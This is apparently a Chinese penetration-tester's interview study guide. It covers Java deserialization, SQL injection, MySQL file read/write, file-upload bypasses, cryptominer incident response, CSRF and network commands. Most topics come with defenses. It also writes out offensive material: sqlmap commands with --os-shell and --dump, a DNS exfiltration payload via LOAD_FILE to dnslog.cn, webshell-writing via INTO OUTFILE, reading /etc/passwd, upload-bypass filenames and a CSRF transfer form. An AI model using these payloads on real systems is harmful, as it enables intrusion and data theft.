# 2020-07-06

# 工作介绍

日常工作偏向于：

- **安全服务 / 渗透测试 / 安全评估**：Web 应用渗透、内网渗透、安全基线核查、漏洞复测。
- **护网（HVV）**：一般驻场，按需出差，每年约 10–20 次；主要负责监测、研判、应急和溯源。
- **入网安评**：根据客户要求做安全测评、等保测评配合、整改建议与复测。
- **红队**：内网渗透、权限维持、横向移动、靶标获取，每年约 2–3 次。

面试时的表述建议：先讲“做过什么”，再讲“怎么做的”，最后讲“结果和复盘”，例如“负责过 X 个 Web 渗透项目，独立完成从信息收集到报告输出的全流程；HVV 期间做值守研判，处置过 X 起告警”。

---

## java 序列化和反序列化的概念

**把对象转换为字节序列的过程称为对象的序列化；把字节序列恢复为对象的过程称为对象的反序列化。**

Java 中由 `ObjectOutputStream.writeObject()` 完成序列化，由 `ObjectInputStream.readObject()` 完成反序列化。一个类只有实现 `java.io.Serializable`（或 `Externalizable`）才能被序列化。

### 关键机制

- `serialVersionUID`：序列化版本号，反序列化时 JVM 会比对，不一致抛 `InvalidClassException`。显式声明可以避免类微调后不兼容。
- `transient`：被修饰的字段不参与序列化；`static` 字段本身属于类，也不参与序列化。
- `Externalizable`：完全由开发者实现 `writeExternal()` / `readExternal()`，可控性更高。
- 反序列化时**不会调用类的构造方法**，但会调用 `readObject()`、`readResolve()`、`readExternal()` 等“魔术方法”，漏洞正是从这些方法里被触发。

### 两种主要用途

1. **持久化**：把对象字节序列保存到硬盘，例如 Web 容器把大量 Session 序列化到磁盘，缓解 10 万并发 Session 占满内存的问题；也可用于缓存、消息队列。
2. **网络传输**：两个进程远程通信时，把 Java 对象转成字节序列传输，接收方再还原。典型场景是 RMI、JMX、JMS、Dubbo、Shiro、WebLogic T3/IIOP。

### 反序列化漏洞（重点）

**成因**：应用把不可信数据直接交给 `readObject()`，攻击者构造恶意字节流，借助目标 classpath 中已有的类形成“gadget chain（利用链）”，最终触发任意代码执行。

常见利用链和入口：

- `CommonsCollections1–7`、`CommonsBeanutils`、`Groovy`、`Spring`、`C3P0`、`JDK7u21`、`JRMPClient` 等，工具主要是 `ysoserial`。
- `Fastjson autoType`、`Jackson enableDefaultTyping()`、`XStream`、`SnakeYAML`。
- `Shiro rememberMe`：Cookie 中 Base64 + AES 加密的序列化数据，密钥泄露后可打 CommonsBeanutils 链。
- `WebLogic T3/IIOP`、`JBoss`、`Jenkins`、`Log4j2 JNDI`（严格说是 JNDI 注入，但常和反序列化一起考）。

**识别**：

- 流量中出现 `AC ED 00 05`（Java 序列化魔数），Base64 后常见 `rO0AB` 开头。
- `ysoserial` 生成 URLDNS 链做无回显探测，配合 DNSLog 判断是否存在反序列化入口。
- Shiro 特征：Cookie 中有 `rememberMe=deleteMe`。

**防御**：

- 不要在不可信边界使用 Java 原生反序列化，优先 JSON/Protobuf 等数据格式。
- 使用 `ObjectInputFilter`（JEP 290）做类白名单，限制可反序列化的类、数组长度、深度。
- 关闭 Fastjson `autoType`，升级到安全版本；Jackson 不要开启 `enableDefaultTyping`。
- 升级 CommonsCollections 等依赖，或加 `SerialKiller`、RASP、WAF 规则。
- 对序列化数据做签名/加密，并校验来源；服务端组件（Shiro、WebLogic）及时打补丁、修改默认密钥。

---

## sqlmap 过 https

sqlmap 一般能自动识别 HTTPS，但在目标强制 SSL、重定向异常或代理环境下，需要显式加 `--force-ssl`：

```bash
sqlmap -u "https://xxx.xxx.xxx.xxx:8843/index.php?id=1" --force-ssl --batch
```

### 常用配套参数

```bash
# 带 Cookie / 自定义 Header
sqlmap -u "https://target.com/a.php?id=1" --force-ssl \
       --cookie="PHPSESSID=xxx" --random-agent

# 从 Burp 保存的请求文件跑，适合 POST/JSON/复杂 Header
sqlmap -r request.txt --force-ssl --batch --level=5 --risk=3

# 指定代理，方便抓包观察
sqlmap -u "https://target.com/a.php?id=1" --force-ssl --proxy="http://127.0.0.1:8080"

# 过 WAF 的 tamper 脚本
sqlmap -u "https://target.com/a.php?id=1" --force-ssl \
       --tamper=space2comment,between,randomcase,charencode

# 指定注入技术：U=联合 B=布尔 E=报错 T=时间 S=堆叠 Q=内联
sqlmap -u "https://target.com/a.php?id=1" --force-ssl --technique=BEUST

# 获取数据 / 系统权限
sqlmap -u "https://target.com/a.php?id=1" --force-ssl --dbs
sqlmap -u "https://target.com/a.php?id=1" --force-ssl -D db -T users --dump
sqlmap -u "https://target.com/a.php?id=1" --force-ssl --os-shell
```

补充：`--force-ssl` 只是强制使用 HTTPS；如果遇到 SNI、证书校验、客户端证书或双向认证，还需要配合 `--proxy`、`--headers`、`--cert` 等参数。扫描前确认授权范围，控制 `--threads` 和请求频率，避免影响业务。

---

## mysql top 是什么？

SQL Server 用 `TOP 10`，MySQL 不支持这个写法，用 `LIMIT` 实现同样的 Top-N 查询；同时 `LIMIT` 还能做分页。

### 基本语法

```sql
SELECT * FROM mytable ORDER BY afield LIMIT 10;          -- 前 10 条
SELECT * FROM mytable ORDER BY afield LIMIT 2, 5;        -- 从第 3 条开始取 5 条
SELECT * FROM mytable ORDER BY afield LIMIT 5 OFFSET 2;  -- 等价写法
```

- `LIMIT offset, recnum`：`offset` 是跳过的记录数（从 0 开始），`recnum` 是返回条数。
- 一定要配合 `ORDER BY`，否则“前 10 条”的顺序由存储引擎决定，结果不稳定。

### 深分页的性能问题

`LIMIT 1000000, 10` 会先扫描并丢弃前 100 万行，越翻越慢。优化方式：

```sql
-- 方案一：延迟关联，先在索引上分页，再回表
SELECT t.* FROM mytable t
JOIN (SELECT id FROM mytable ORDER BY id LIMIT 1000000, 10) x ON t.id = x.id;

-- 方案二：游标/键集分页（推荐）
SELECT * FROM mytable WHERE id > 1000000 ORDER BY id LIMIT 10;
```

### 分组取 Top-N（MySQL 8.0）

```sql
SELECT * FROM (
  SELECT *, ROW_NUMBER() OVER (PARTITION BY dept_id ORDER BY salary DESC) AS rn
  FROM employee
) t WHERE t.rn <= 3;
```

其他数据库对照：SQL Server `SELECT TOP 10 ...`；Oracle 12c+ `FETCH FIRST 10 ROWS ONLY`，老版本用 `ROWNUM`；PostgreSQL 与 MySQL 一样用 `LIMIT`。

---

## sql 注入分哪几种？

面试时建议按“**注入点 → 数据类型 → 利用技术 → 数据库类型**”四个维度回答，比只背 GET/POST/Cookie 完整得多。

### 1. 按注入点分类

- **GET 参数注入**：`?id=1'`，最常见。
- **POST 参数注入**：表单、JSON、XML  body。
- **Cookie 注入**：如 `Cookie: uid=1'`，常出现在“记住我”、购物车、会话标识。
- **HTTP Header 注入**：`User-Agent`、`Referer`、`X-Forwarded-For`、`X-Real-IP` 被写进 SQL 或日志后拼接。
- **二阶注入（Second-Order）**：第一次存入时被转义，后续从数据库取出再拼接执行，典型如注册用户名、修改资料。

### 2. 按数据类型分类

- **数字型**：`id=1 AND 1=1`，不需要引号闭合。
- **字符型**：`name='admin' AND '1'='1`，需要处理引号。
- **搜索型 / LIKE 型**：`%' AND 1=1 --+`，注意 `%` 和 `_` 通配符。

### 3. 按利用技术分类

- **联合查询（UNION）**：先 `ORDER BY n` 猜列数，再 `UNION SELECT` 回显数据。
- **报错注入**：`extractvalue()`、`updatexml()`、`floor(rand()*2)`，适用于页面回显数据库报错。
- **布尔盲注**：`AND substr(database(),1,1)='a'`，根据页面真/假判断。
- **时间盲注**：`AND SLEEP(5)`、`BENCHMARK()`，适用于完全无回显。
- **堆叠注入**：`; INSERT/UPDATE/DROP ...`，取决于驱动是否允许多语句（如 PHP PDO 默认不允许）。
- **带外注入（OOB）**：DNS/HTTP 外带，MySQL 用 `LOAD_FILE(CONCAT('\\\\',(SELECT ...),'.dnslog.cn\\a'))`，MSSQL 用 `xp_dirtree`。
- **宽字节注入**：GBK 编码下 `%df'` 吃掉转义反斜杠，形成 `%df%5c'`。

### 4. 按数据库/场景分类

MySQL、MSSQL、Oracle、PostgreSQL、Access、SQLite，以及 NoSQL 注入（MongoDB 的 `$ne`、`$gt`）、ORM 注入、模板注入（严格说属于 SSTI，但常一起问）。

### 防御

- **预编译/参数化查询**是根本，`PreparedStatement` 把数据和 SQL 结构分离。
- 白名单校验参数类型、长度、范围；ORM 避免字符串拼接。
- 数据库最小权限，Web 账号不要有 `FILE`、`SUPER` 权限。
- 关闭详细报错，统一错误页；WAF 做兜底但不可依赖。
- 敏感操作加二次校验，日志留痕。

---

## mysql 手工导入导出文件？

### 导出

**方式一：mysqldump（推荐，逻辑备份）**

```bash
# 导出单个库
mysqldump -u root -p db_school > db_school.sql

# 导出指定表
mysqldump -u root -p db_school users orders > users_orders.sql

# 只导结构 / 只导数据
mysqldump -u root -p --no-data db_school > schema.sql
mysqldump -u root -p --no-create-info db_school > data.sql

# 全库 + 存储过程/触发器，InnoDB 用一致性快照
mysqldump -u root -p --all-databases --routines --triggers --single-transaction > all.sql
```

**方式二：SELECT ... INTO OUTFILE（服务器端写文件）**

```sql
SELECT * FROM users INTO OUTFILE '/tmp/users.txt'
FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"'
LINES TERMINATED BY '\n';
```

限制条件：

- 需要 `FILE` 权限，且 `secure_file_priv` 允许该路径（`SHOW VARIABLES LIKE 'secure_file_priv';`）。
- 文件必须**不存在**，否则报错；路径必须是服务器上的绝对路径。
- `INTO OUTFILE` 不能覆盖已有文件，`INTO DUMPFILE` 只能写单行二进制。
- 常见 getshell 组合：`secure_file_priv` 为空 + Web 目录可写 + `INTO OUTFILE` 写 webshell；或开启 `general_log` 写日志文件 getshell。

### 导入

```bash
# 命令行导入
mysql -u root -p db_school < db_school.sql

# 登录后 source
mysql> use db_school;
mysql> source /path/db_school.sql;
```

```sql
-- 服务器端读文件
LOAD DATA INFILE '/tmp/users.txt' INTO TABLE users
FIELDS TERMINATED BY ',' LINES TERMINATED BY '\n';

-- 读取任意文件（需 FILE 权限 + secure_file_priv 允许）
SELECT LOAD_FILE('/etc/passwd');
```

注意 Windows 路径要写成 `C:/tmp/a.txt` 或 `C:\\tmp\\a.txt`；导出目录要确认 MySQL 服务账号有写权限。

---

## 文件上传，绕过思路？

核心思路：**让服务器“以为”是图片，但最终按脚本解析**。按中间件和绕过层次分别记。

### 1. 按中间件/解析漏洞

**IIS 6.0**

- 目录名以 `.asp` 结尾：`/upload/xx.asp/xx.jpg`，目录下所有文件按 ASP 解析。
- 分号截断：`xx.asp;.jpg`，IIS 6 只认分号前的扩展名。

**IIS 7.0/7.5**

- FastCGI 解析漏洞：`http://target/upload/1.jpg/.php`，在图片路径后加 `/.php`，可能被当成 PHP 执行。
- `xx.aspx;.jpg` 类似分号处理。

**Nginx**

- 版本 ≤ 0.8.37 或 `cgi.fix_pathinfo=1` 时：`/upload/1.jpg/x.php`，Nginx 把请求交给 PHP-FPM，PHP 向前回溯找到 `1.jpg` 并解析。
- 空字节截断（PHP < 5.3.4）：`xx.jpg%00.php`。
- CVE-2013-4547：`xx.jpg` + 空格 + `%00.php`，利用 Nginx 对 URI 空格和空字节处理不一致。
- 配置不当：`location ~ .php$` 只匹配结尾，而 `fastcgi_split_path_info` 没配对，导致图片被解析。

**Apache**

- 多扩展名从右往左判断：`test.php.x1.x2.x3` 在 `AddHandler application/x-httpd-php .php` 配置下可能被解析。
- `.htaccess` 上传：如果允许上传 `.htaccess` 且目录 AllowOverride 开启，写入 `AddType application/x-httpd-php .jpg`，之后上传的 jpg 全部按 PHP 执行；也可用 `php_value auto_prepend_file` 包含图片马。
- `mod_mime` 的 `AddHandler` 比 `AddType` 更容易被多后缀绕过。

**lighttpd**

- `xx.jpg/xx.php` 路径信息解析，原理同 Nginx/PHP-FPM；老版本还存在 `xx.jpg.php` 直接解析。

### 2. 通用绕过手法

- **前端校验绕过**：直接改 Burp 包，跳过 JS 的扩展名/大小检查。
- **Content-Type 绕过**：把 `application/x-php` 改成 `image/jpeg`。
- **文件头/魔术字节**：加 `GIF89a`、`\xFF\xD8\xFF`、`PK\x03\x04`，做成“图片马”；配合解析漏洞或文件包含执行。
- **大小写 / 双写 / 空格 / 点**：`x.PHP`、`x.pphphp`、`x.php `、`x.php.`（Windows 会去掉末尾点和空格）。
- **NTFS 数据流**：`x.php::$DATA`，Windows 下保存为 `x.php`。
- **双扩展名**：`x.php.jpg`、`x.jpg.php`，看中间件取哪一段。
- **00 截断 / 超长文件名截断**：老版本 PHP、Java、中间件存在，利用 `%00` 或超过 255 字节截断。
- **解析后缀替换**：`.phtml`、`.php3`、`.php4`、`.php5`、`.pht`、`.phar`、`.shtml`、`.asa`、`.cer`。
- **配置文件**：`.user.ini`（PHP-FPM 下 `auto_prepend_file`）、`.htaccess`、`web.config`。
- **竞争条件**：上传后先校验再删除，利用删除前的时间窗口访问；或上传 `.htaccess` 后立刻上传图片马。
- **压缩包/解析链**：上传 zip、svg（含脚本）、html，配合解压、预览、SSRF。
- **路径穿越**：文件名带 `../` 写到 Web 目录；或上传到可访问的静态目录。
- **WAF 绕过**：分块传输、`multipart` 边界混淆、参数污染、Unicode/双重 URL 编码。

### 3. 防御

- **白名单**扩展名 + 校验真实文件类型（magic number），不只看 `Content-Type`。
- 上传后**重命名**为随机字符串，去掉原扩展名；存储到**Web 根目录之外**。
- 上传目录关闭脚本执行权限（Nginx `location` 禁止 `.php`，Apache `php_flag engine off`）。
- 图片做二次渲染/压缩，破坏隐藏脚本；限制大小、数量、频率。
- 及时升级中间件，修复解析漏洞；WAF 兜底；上传接口加鉴权，防止未授权上传。

---

## 应急响应——挖矿病毒都有吗？思路是什么？

先纠正一个常见误区：**不是所有被入侵的主机都中挖矿病毒**，挖矿只是最常见的一种“变现方式”。应急响应的核心是“**止损 → 取证 → 排查 → 清除 → 加固 → 复盘**”，而不是一上来就杀毒。

### 0. 事前准备

- 资产清单、网络拓扑、关键业务端口、账号权限。
- 日志集中存储（系统日志、Web 日志、安全设备日志），确保入侵后日志不被删。
- 准备隔离工具、取证 U 盘、镜像工具、EDR/杀软离线包。
- 明确联系人、上报流程、备份策略。

### 1. 接警与止损

- 确认现象：CPU/GPU 占用高、风扇狂转、电费异常、对外大量连接、业务变慢、安全设备告警。
- **先隔离，后分析**：拔网线或在下游交换机/防火墙封禁，保留现场；不要急着重装。
- 需要保留的证据：内存镜像、磁盘镜像、进程列表、网络连接、日志、计划任务、注册表/启动项、Web 目录。
- 如果怀疑勒索病毒，**立即断网并检查备份**，不要轻易重启（可能触发加密或丢失内存证据）。

### 2. Windows 排查清单

```cmd
tasklist /svc
tasklist /m
wmic process get name,processid,executablepath,commandline
netstat -ano
netstat -anob
schtasks /query /fo LIST /v
sc query state= all
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

重点看：

- 可疑进程名（伪装成 `svchost.exe`、`explorer.exe` 但路径不对、无签名）。
- 异常外连：矿池域名/IP、`stratum+tcp://`、高频 3333/4444/5555/7777/14444 等端口。
- 计划任务、服务、注册表 Run、启动文件夹、WMI 事件订阅。
- 账号：`net user`、`net localgroup administrators`，是否有隐藏账号、克隆账号。
- 远程入口：RDP 日志（4624/4625）、`termsrv`、TeamViewer/AnyDesk 等远控。
- Web 目录：最近修改的 `.php/.jsp/.aspx`、一句话木马、`upload` 目录异常文件。
- 浏览器/邮件：钓鱼附件、恶意宏。

工具：Process Explorer、Autoruns、PCHunter、火绒剑、Sysinternals、深信服/奇安信 EDR、微步在线、VirusTotal。

### 3. Linux 排查清单

```bash
ps aux --sort=-%cpu | head
top -c
ls -la /proc/<pid>/exe
cat /proc/<pid>/cmdline
netstat -tunlp
ss -tunlp
lsof -i -P -n
crontab -l; cat /etc/crontab; ls -la /etc/cron.*
systemctl list-units --type=service
cat /etc/rc.local
ls -la /etc/init.d/
cat /etc/passwd; awk -F: '$3==0' /etc/passwd
cat ~/.ssh/authorized_keys
ls -la /tmp /var/tmp /dev/shm
cat /etc/ld.so.preload
```

重点看：高 CPU 进程、`/tmp` 下随机名可执行文件、`curl/wget` 下载、`chattr +i` 锁文件、`ld.so.preload` 劫持、SSH 公钥后门、rootkit（`rkhunter`、`chkrootkit`、`unhide`）。

### 4. 挖矿病毒典型特征

- 进程名伪装：`kdevtmpfsi`、`kinsing`、`xmrig`、`sysupdate`、`networkservice`。
- 配置文件/矿池：`pool.minexmr.com`、`f2pool.com`、`stratum+tcp://`、钱包地址。
- 持久化：cron 定时拉取、systemd 服务、`rc.local`、`/etc/ld.so.preload`、Docker 容器内。
- 传播：Redis 未授权、SSH 弱口令、RDP 爆破、永恒之蓝（445）、Log4j、Web 漏洞、Kubernetes 未授权。
- 常伴随：`chattr +i` 防删除、kill 安全进程、修改 hosts、清日志、装 rootkit。

处置：断网 → 记录进程/文件/网络证据 → 结束进程 → 删除文件和持久化项 → 解锁 `chattr -i` → 修复入口（改密码、打补丁、关端口）→ 全盘查杀 → 观察是否复发。**不要只杀进程不清持久化，否则重启就复活。**

### 5. Web 应急

- 网站被篡改/挂黑页：查 Web 访问日志、Tomcat/Nginx/Apache 日志，定位上传/包含/反序列化入口。
- 找 webshell：按时间排序最近修改文件、搜 `eval`、`assert`、`base64_decode`、`Runtime.getRuntime().exec`、冰蝎/哥斯拉特征。
- 查数据库：是否被拖库、是否有异常账号。
- 查中间件：Tomcat `manager` 弱口令、Nginx 配置、FastCGI 暴露。

### 6. 勒索病毒专项

- 确认家族（后缀、勒索信、样本 hash），查解密工具（No More Ransom）。
- 断网隔离，保留样本和日志，检查备份是否被加密。
- 排查入口：RDP 爆破、弱口令、漏洞（永恒之蓝、Log4j）、钓鱼邮件、供应链。
- 恢复：从离线备份恢复，重建主机，修改所有相关口令，打补丁。

### 7. 加固与复盘

- 补漏洞、关不必要的 445/3389/6379/22 暴露，改弱口令，开 MFA。
- 最小权限、网络分区、EDR 覆盖、日志留存、备份演练。
- 输出报告：时间线、根因、影响范围、处置动作、改进项。

---

## 跨站请求伪造（CSRF）

先纠正一个常见错误说法：**XSS 不是“实现 CSRF 的手段之一”**。两者是不同漏洞：

- **XSS**：在受害者浏览器里执行攻击者的脚本，脚本运行在目标站点的源下，可以读取页面、窃取 Cookie/Token。
- **CSRF**：攻击者诱导已登录用户向目标站点发起一个**用户不知情**的请求，浏览器会自动带上 Cookie，但攻击者**读不到响应**。

XSS 可以辅助 CSRF（比如绕过 Token），但 CSRF 本身不依赖 XSS。

### 原理与触发条件

CSRF 成立通常需要三个条件：

1. 用户已在目标站点登录，认证信息放在 Cookie 中且浏览器自动携带。
2. 请求参数可预测，服务端没有校验请求是否由用户主动发起。
3. 攻击者能诱导用户访问恶意页面或点击链接。

### 常见利用方式

```html
<!-- GET 型：图片标签自动发请求 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">

<!-- POST 型：自动提交表单 -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('f').submit();</script>
```

其他场景：JSON CSRF（`text/plain` 表单 + CORS 配置不当）、登录 CSRF、结合 XSS 绕过 Token、利用 302 跳转/`window.open`。

### 防御

- **CSRF Token**：服务端生成随机 Token，绑定 Session，表单/请求头携带，服务端校验；Token 一次性或有时效。
- **SameSite Cookie**：`SameSite=Lax` 或 `Strict`，从浏览器层面限制跨站携带 Cookie；`None` 必须配 `Secure`。
- **校验 Referer / Origin**：检查请求来源域名是否在白名单。
- **双重提交 Cookie**：Token 同时放 Cookie 和请求参数，服务端比对。
- **自定义请求头**：如 `X-Requested-With: XMLHttpRequest`，跨域表单无法自定义头（但 CORS 配置错误时可能失效）。
- **敏感操作二次认证**：转账、改密前重新输入密码/短信验证码。
- **CORS 配置收紧**：不要反射 `Origin`，不要对敏感接口开放 `*`。

注意：GET 请求不应有副作用；所有写操作使用 POST/PUT/DELETE，并配合 Token 和 SameSite。

---

## windows 查看网络命令

### netstat

```
NETSTAT [-a] [-b] [-e] [-f] [-n] [-o] [-p proto] [-r] [-s] [-x] [-t] [interval]

  -a            显示所有连接和侦听端口。
  -b            显示创建每个连接或侦听端口时涉及的可执行程序。
  -e            显示以太网统计信息，可与 -s 结合。
  -f            显示外部地址的完全限定域名（FQDN）。
  -n            以数字形式显示地址和端口号。
  -o            显示与每个连接关联的进程 ID。
  -p proto      显示指定协议的连接：TCP、UDP、TCPv6、UDPv6。
  -q            显示所有连接、侦听端口和绑定的非侦听 TCP 端口。
  -r            显示路由表。
  -s            显示每个协议的统计信息。
  -t            显示当前连接卸载状态。
  -x            显示 NetworkDirect 连接、侦听器和共享终结点。
  -y            显示所有连接的 TCP 连接模板（不能与其他选项组合）。
  interval      重新显示统计信息的间隔秒数，Ctrl+C 停止。
```

常见组合：

```cmd
netstat -ano                 :: 所有连接 + PID，最常用
netstat -ano | findstr :80   :: 查 80 端口
netstat -anob                :: 显示进程名（需管理员）
tasklist /FI "PID eq 1234"   :: 根据 PID 查进程
```

### 其他常用命令

```cmd
ipconfig /all                 :: IP、网关、DNS、MAC
ipconfig /flushdns            :: 清 DNS 缓存
route print                   :: 路由表
arp -a                        :: ARP 缓存
nslookup domain               :: DNS 查询
ping / tracert / pathping     :: 连通性与路径
netsh interface ip show config
netsh advfirewall show allprofiles
net use                       :: 已建立的网络共享
net share                     :: 本机共享
net session                   :: 当前会话
```

### PowerShell 等价命令

```powershell
Get-NetTCPConnection -State Listen
Get-NetTCPConnection -LocalPort 80
Get-Process -Id <pid>
Get-NetIPConfiguration
Get-NetRoute
Get-DnsClientCache
Test-NetConnection host -Port 443
```

---

## linux 查看网络命令

### 查看地址与路由

```bash
ip addr            # 查看 IP、网卡、MAC（推荐，替代 ifconfig）
ip addr show eth0
ip route           # 查看路由表（替代 route -n）
ip route get 8.8.8.8
ifconfig           # 老命令，net-tools 包
route -n           # 老命令，查看网关
```

`ifconfig` 看不到网关，看网关用 `ip route`、`route -n` 或 `netstat -rn`。

### netstat / ss

```bash
netstat -tunlp     # TCP/UDP、数字显示、监听、进程
netstat -anp       # 所有连接 + 进程
netstat -rn        # 路由表

ss -tunlp          # 推荐，性能更好，替代 netstat
ss -lntp           # 仅 TCP 监听
ss -tn state established
```

选项含义：

- `-t`：TCP；`-u`：UDP；`-n`：不解析域名/服务名；`-l`：仅监听；`-a`：所有连接；`-p`：显示进程；`-r`：路由。

### 其他常用命令

```bash
lsof -i :80                 # 哪个进程占用 80
lsof -i -P -n               # 所有网络连接
fuser -n tcp 80             # 查端口占用
tcpdump -i eth0 -nn port 80 # 抓包
dig +short example.com      # DNS
traceroute example.com
nmap -sT -p- 127.0.0.1      # 本机端口扫描
cat /etc/services           # 服务与端口对照
iptables -L -n -v           # 防火墙规则
firewall-cmd --list-all     # firewalld
```

---

## 查看端口

### Windows

```cmd
netstat -ano | findstr :8080
netstat -anob | findstr :8080
tasklist /FI "PID eq <PID>"
wmic process where processid=<PID> get name,executablepath,commandline
```

PowerShell：

```powershell
Get-NetTCPConnection -LocalPort 8080 -ErrorAction SilentlyContinue
Get-Process -Id (Get-NetTCPConnection -LocalPort 8080).OwningProcess
```

### Linux

```bash
ss -lntp | grep :8080
netstat -tunlp | grep :8080
lsof -i :8080
fuser -n tcp 8080
cat /proc/net/tcp            # 十六进制端口，0x1F90 = 8080
nmap -sT -p 8080 127.0.0.1
```

### 排查思路

1. 确认端口是否监听：`ss -lntp` / `netstat -ano`。
2. 找到 PID：`-p` / `-o`。
3. 定位进程和路径：`ps -fp <pid>`、`/proc/<pid>/exe`、`tasklist`、`wmic`。
4. 判断是否需要：业务进程、临时测试、可疑后门。
5. 关闭：`kill <pid>`、`systemctl stop <svc>`、`taskkill /PID <pid> /F`，并在防火墙层面封禁。
